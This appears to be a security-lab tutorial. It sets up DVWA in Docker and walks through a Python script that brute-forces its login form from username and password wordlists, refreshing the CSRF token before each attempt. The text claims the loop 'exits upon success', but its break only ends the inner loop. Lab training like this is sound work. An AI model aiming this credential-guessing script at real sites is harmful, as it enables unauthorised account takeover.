### Ethical Login Testing


This document provides a guide to ethically automate login testing using Python, targeting a web application hosted via Poridhi's load balancer. The script tests username-password combinations dynamically while handling CSRF tokens to ensure compliance with server-side protections. The setup involves using a Docker container to simulate the target environment and securely testing login credentials.


### **Objective**

1. **Test login functionality**: Validate credentials against a web application's login form.
2. **Handle CSRF Protection**: Dynamically extract and use CSRF tokens to bypass security mechanisms.
3. **Simulate ethical brute-forcing**: Automate username-password testing in a controlled environment.
4. **Demonstrate security insights**: Highlight the importance of robust error handling and CSRF implementation.

### **Create the Docker Container and Run it via Poridhi's Load Balancer**

1. **Pull the DVWA Docker Image**:
   ```bash
   docker pull vulnerables/web-dvwa
   ```

2. **Run the DVWA Container**:
   ```bash
   docker run -d -p 80:80 vulnerables/web-dvwa
   ```

3. **Access the Application via Poridhi's Load Balancer**:
   - The load balancer is configured at `https://66dbf2e46722fdb9097e9eb5-lb-427.bm-north.lab.poridhi.io/`.
   - Ensure the container is reachable through the load balancer URL.

4. **Set the DVWA Security Level**:
   - Open the load balancer URL in a browser.
   - Log in using the default credentials:
     - **Username**: `admin`
     - **Password**: `password`
   - Navigate to the **DVWA Security** tab and set the security level to **Low**.



### **Script**

Here’s the Python script to automate login testing:

```python
import requests
import re

# Base URL and login endpoint
url_base = "https://66dbf2e46722fdb9097e9eb5-lb-427.bm-north.lab.poridhi.io/"
url_login = url_base + "login.php"

# File paths for usernames and passwords
path_users_file = 'usernames.txt'
path_passwords_file = 'passwords.txt'

# Function to retrieve CSRF token
def get_csrf_token(session):
    response = session.get(url_login)
    if response.status_code == 200:
        match = re.search(r"name='user_token' value='(.*?)'", response.text)
        if match:
            return match.group(1)
    print("Failed to retrieve CSRF token.")
    return None

# Function to attempt login
def attempt_login(session, username, password, csrf_token):
    login_data = {
        'username': username,
        'password': password,
        'Login': 'Login',
        'user_token': csrf_token
    }
    response = session.post(url_login, data=login_data)
    if "Login failed" not in response.text:
        return True
    return False

# Read usernames and passwords from files
with open(path_users_file, 'r') as f:
    usernames = [line.strip() for line in f]
with open(path_passwords_file, 'r') as f:
    passwords = [line.strip() for line in f]

# Initialize session and validate connection
session = requests.Session()
response = session.get(url_base)
if response.status_code != 200:
    print("Unable to connect to the application.")
    exit()

# Main script logic
csrf_token = get_csrf_token(session)
if not csrf_token:
    exit()

for username in usernames:
    for password in passwords:
        csrf_token = get_csrf_token(session)  # Refresh token for each attempt
        if attempt_login(session, username, password, csrf_token):
            print(f"Success! Username: {username}, Password: {password}")
            break
```



### **Explanation of the Script**

1. **Initial Setup**:
   - **URLs**: Define the base URL and login endpoint for Poridhi's load balancer.
   - **File Paths**: Specify file paths for `usernames.txt` and `passwords.txt`.

2. **Retrieve CSRF Token**:
   - **Function**: `get_csrf_token`
   - Sends a GET request to the login page.
   - Extracts the CSRF token (`user_token`) using a regular expression.

3. **Attempt Login**:
   - **Function**: `attempt_login`
   - Sends a POST request with the username, password, CSRF token, and form data.
   - Validates login success by checking the absence of `"Login failed"` in the server response.

4. **File Handling**:
   - Reads usernames and passwords from `usernames.txt` and `passwords.txt`.

5. **Main Logic**:
   - Loops through each username-password combination.
   - Refreshes the CSRF token for every login attempt.
   - Prints successful credentials and exits upon success.



### **Run the Script**

1. **Prepare Input Files**:
   - **`usernames.txt`**:
     ```
     admin
     user
     test
     guest
     ```
   - **`passwords.txt`**:
     ```
     password
     admin
     guest
     test123
     ```

2. **Save the Script**:
   - Save the script as `test.py` in the same directory as the input files.

3. **Run the Script**:
   ```bash
   python3 test.py
   ```

### **Expected Output**

If the script identifies valid credentials, it will print:
```
Success! Username: admin, Password: password
```

If no valid credentials are found, the script will terminate without any output.

### **Conclusion**

This guide demonstrates how to set up a controlled environment using Poridhi's load balancer and Docker for testing login credentials with a Python script. The script highlights the importance of CSRF protection and error handling in web applications. Use this script responsibly and only in environments where you have explicit permission for ethical testing.